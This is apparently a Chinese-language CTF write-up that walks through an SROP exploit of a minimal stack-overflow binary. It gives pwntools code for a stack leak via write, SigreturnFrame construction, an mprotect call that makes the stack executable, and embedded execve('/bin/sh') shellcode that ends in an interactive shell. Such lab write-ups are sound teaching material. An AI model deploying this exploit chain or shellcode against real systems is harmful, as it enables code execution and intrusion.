# SROP

SROP是一种特殊的rop。

## Vuln
程序漏洞明显，就是栈溢出，而且没有加载so库，只有短短几十字节代码。

## leak
leak的话，利用write函数即可

```Python
def sm_leak():
    payload = p64(main_vuln_addr)*3
    io.send(payload)
    payload = p64(0x4000B3)[0]  # write(1, stack, 0x400)
    io.send(payload)
    data = io.recv(0x200)
    io.clean()
    return data
```

主要的技巧就是:

1. 先读取一次，这样栈上先覆盖几个main函数地址。
2. 读取第二次的时候，故意取n个字节读取，从而控制rax的值。(根据read返回值是读取到的字节数)
3. 注意第二次读取的时候，ret的地址要改成syscall

## SROP
新姿势srop
### Ref
[srop原理](http://www.freebuf.com/articles/network/87447.html)


```Python
def sm_func(func_id, marg0, marg1, marg2, mstack, mrip):
    mframe = SigreturnFrame()
    mframe.rax = func_id
    mframe.rdi = marg0
    mframe.rsi = marg1
    mframe.rdx = marg2
    mframe.rsp = mstack
    mframe.rip = mrip
    sig_padding = p64(main_vuln_addr)
    sig_padding += p64(syscall_addr)
    payload = sig_padding + str(mframe)
    return payload
```
### step1
首先要把之前leak的栈地址给填充真正的rop

```Python
lk_use_addr = sm_leak()[0x10:0x18]
lk_use_addr = (u64(lk_use_addr)-0x400)&0xFFFFFFFFFFFFF000
log.info("rop address : " + hex(lk_use_addr))
payload = sm_func(constants.SYS_read, constants.STDIN_FILENO, lk_use_addr, 0x400, lk_use_addr, syscall_addr).ljust(0x400, chr(0))
io.send(payload)
payload = payload[8:23]
io.send(payload)
```

### 调用mprotect

调用mrpotct并且rsp转移到一个地址，这个地址填充shellcode地址。<br>


```Python
# size must be 0x1000*n
# mprotect(lk_use_addr, 0x1000, 7)
payload = sm_func(constants.SYS_mprotect, lk_use_addr, 0x1000, 7, lk_use_addr+0x200, syscall_addr).ljust(0x200, chr(0))
payload += p64(lk_use_addr+0x208)   # rop to shellcode address
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
io.send(payload.ljust(0x400, chr(0)))
payload = payload[8:23]
io.send(payload)
io.interactive()
```

## Tips
注意，read是阻塞，所以send后面需要加延时，这样才不使得read(0, buf, 0x400)一定是接收0x400字节
